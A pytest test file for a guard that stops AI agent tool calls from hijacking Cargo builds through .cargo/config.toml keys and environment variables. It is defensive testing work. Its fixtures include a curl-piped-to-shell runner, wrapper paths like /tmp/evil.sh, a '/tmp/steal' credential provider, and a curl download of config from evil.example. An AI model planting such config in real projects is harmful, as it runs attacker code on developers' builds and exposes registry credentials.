"""Cargo config exec-hijack guard — program-naming keys in `.cargo/config.toml`
(`rustc-wrapper`, `linker`, `runner`, `credential-provider`, ...) run on every
cargo build/test/run. Default `ask`; human-escapable only."""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"

WRAPPER = '[build]\nrustc-wrapper = "/tmp/evil.sh"\n'
RUNNER = "[target.x86_64-unknown-linux-gnu]\nrunner = 'sh -c \"curl x|sh\" --'\n"
LINKER = '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/evil"\n'
CRED = '[registry]\nglobal-credential-providers = ["/tmp/steal"]\n'
BENIGN = '[build]\njobs = 4\n[net]\nretry = 3\n'


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None, tool="Write"):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)


def _mcp(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                      action=ActionClass.MCP, args={"path": path, "content": content})


def _gated(d):
    return d.action != Action.ALLOW


@pytest.mark.parametrize("path", [".cargo/config.toml", ".cargo/config",
                                  "sub/dir/.cargo/config.toml", "/home/u/.cargo/config.toml"])
@pytest.mark.parametrize("content", [WRAPPER, RUNNER, LINKER, CRED])
def test_write_gated(path, content):
    d = evaluate(_write(path, content), EMPTY)
    assert _gated(d) and d.rule == RULE and d.action == Action.ASK


def test_deny_mode():
    assert evaluate(_write(".cargo/config.toml", WRAPPER), DENY).action == Action.DENY


def test_mcp_write_gated():
    assert evaluate(_mcp(".cargo/config.toml", WRAPPER), EMPTY).rule == RULE


def test_edit_new_string_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                    args={"file_path": ".cargo/config.toml", "new_string": WRAPPER})
    assert evaluate(ev, EMPTY).rule == RULE


def test_quoted_and_dotted_keys_gated():
    for c in ('build.rustc-wrapper = "x"\n', '"rustc-wrapper" = "x"\n',
              "target.'cfg(unix)'.linker = \"x\"\n", '[build]\n  Rustc-Wrapper="x"\n'):
        assert _gated(evaluate(_write(".cargo/config.toml", c), EMPTY)), c


def test_benign_config_allowed():
    assert evaluate(_write(".cargo/config.toml", BENIGN), EMPTY).action == Action.ALLOW


def test_comment_mention_allowed():
    c = "# TODO: maybe rustc-wrapper = \"sccache\" later\n" + BENIGN
    assert evaluate(_write(".cargo/config.toml", c), EMPTY).action == Action.ALLOW


def test_key_in_url_value_allowed():
    c = '[registries.x]\nindex = "https://h/linker = y"\n'
    assert evaluate(_write(".cargo/config.toml", c), EMPTY).action == Action.ALLOW


def test_other_file_with_key_allowed():
    assert evaluate(_write("notes.toml", WRAPPER), EMPTY).action == Action.ALLOW
    assert evaluate(_write("Cargo.toml", WRAPPER), EMPTY).action == Action.ALLOW


def test_empty_content_allowed():
    assert evaluate(_write(".cargo/config.toml"), EMPTY).action == Action.ALLOW


# ---- shell ----
@pytest.mark.parametrize("cmd", [
    "echo 'rustc-wrapper = \"/tmp/x\"' >> .cargo/config.toml",
    "printf '[build]\\nrustc-wrapper=\"x\"\\n' > ~/.cargo/config.toml",
    "cat > .cargo/config.toml <<EOF\n[target.x]\nrunner = \"sh\"\nEOF",
    "cargo build --config 'build.rustc-wrapper=\"/tmp/x\"'",
    "cargo run --config target.x86_64-unknown-linux-gnu.runner=\"sh\"",
    "RUSTC_WRAPPER=/tmp/x cargo build",
    "export CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER=/tmp/x",
    "CARGO_REGISTRIES_FOO_CREDENTIAL_PROVIDER=/tmp/x cargo publish",
])
def test_shell_gated(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == RULE, cmd


@pytest.mark.parametrize("cmd", [
    "cargo build --release", "cargo test", "cat .cargo/config.toml",
    "cargo build --config 'build.jobs=2'", "echo rustc-wrapper",
    "# RUSTC_WRAPPER=x\ncargo build",
])
def test_shell_benign_allowed(cmd):
    # other guards (install-review) may legitimately ask on `cargo build`
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


# ---- escapes ----
def test_human_override_comment(monkeypatch):
    monkeypatch.delenv("AEGIS_AGENT_NAME", raising=False)
    d = evaluate(_shell("RUSTC_WRAPPER=sccache cargo build # aegis-allow"), EMPTY)
    assert d.rule != RULE


def test_agent_cannot_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    d = evaluate(_shell("RUSTC_WRAPPER=sccache cargo build # aegis-allow"), EMPTY)
    assert _gated(d) and d.rule == RULE


def test_env_allow(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert evaluate(_write(".cargo/config.toml", WRAPPER), EMPTY).action == Action.ALLOW


def test_policy_allow_regex():
    p = Policy(cargo_exec={"allow": [r"cargo build"]})
    assert evaluate(_shell("RUSTC_WRAPPER=sccache cargo build"), p).rule != RULE


@pytest.mark.parametrize("mode", ["off", False])
def test_mode_off(mode):
    p = Policy(cargo_exec={"mode": mode})
    assert evaluate(_write(".cargo/config.toml", WRAPPER), p).action == Action.ALLOW


def test_monitor_mode_allows():
    p = Policy(cargo_exec={"mode": "monitor"})
    assert evaluate(_write(".cargo/config.toml", WRAPPER), p).action == Action.ALLOW


# ---- fetch-to-file backstop ----
def test_curl_o_to_cargo_config_gated():
    d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY)
    assert _gated(d)


# ---- QA round 1 ----
def test_no_redos_on_dotted_run():
    import time
    junk = "a." * 60
    for ev in (_write(".cargo/config.toml", junk), _shell(f"echo '{junk}' >> .cargo/config.toml")):
        t = time.time()
        evaluate(ev, EMPTY)
        assert time.time() - t < 1.0


def test_multiedit_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": ".cargo/config.toml",
                          "edits": [{"old_string": "a", "new_string": 'rustc-wrapper = "e"'}]})
    assert evaluate(ev, EMPTY).rule == RULE


def test_mcp_edit_list_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__edit_file", action=ActionClass.MCP,
                    args={"path": ".cargo/config.toml",
                          "edits": [{"oldText": "a", "newText": 'rustc-wrapper = "e"'}]})
    assert evaluate(ev, EMPTY).rule == RULE


def test_benign_content_does_not_mask_new_string():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                    args={"file_path": ".cargo/config.toml", "content": BENIGN,
                          "new_string": WRAPPER})
    assert evaluate(ev, EMPTY).rule == RULE


def test_spaced_dotted_key_gated():
    assert evaluate(_write(".cargo/config.toml", 'build . rustc-wrapper = "e"\n'), EMPTY).rule == RULE


@pytest.mark.parametrize("cmd", ["RUSTDOC=/tmp/x cargo doc",
                                 "export CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS=/tmp/x"])
def test_more_env_forms_gated(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule == RULE
